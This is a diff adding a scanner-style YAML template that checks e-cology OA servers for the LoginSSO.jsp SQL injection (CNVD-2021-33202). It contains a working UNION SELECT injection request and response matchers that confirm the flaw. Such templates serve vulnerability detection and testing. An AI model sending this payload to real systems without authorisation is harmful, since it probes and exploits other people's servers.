@@ -1,0 +1,25 @@
+id: CNVD-2021-33202
+brief:
+    title: OA E-Cology LoginSSO.jsp - SQL Injection
+    by: SleepingBag945
+    level: high
+    about: e-cology is an OA office system specially produced for large and medium-sized enterprises. It supports simultaneous office work on PC, mobile and WeChat terminals. There is a SQL injection vulnerab...
+    label:
+        - cnvd2021
+        - cnvd
+        - e-cology
+        - sqli
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20md5({{num}})%20as%20id%20from%20HrmResourceManager'
+      signs:
+        - "on": word
+          has:
+            - '{{md5(num)}}'
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
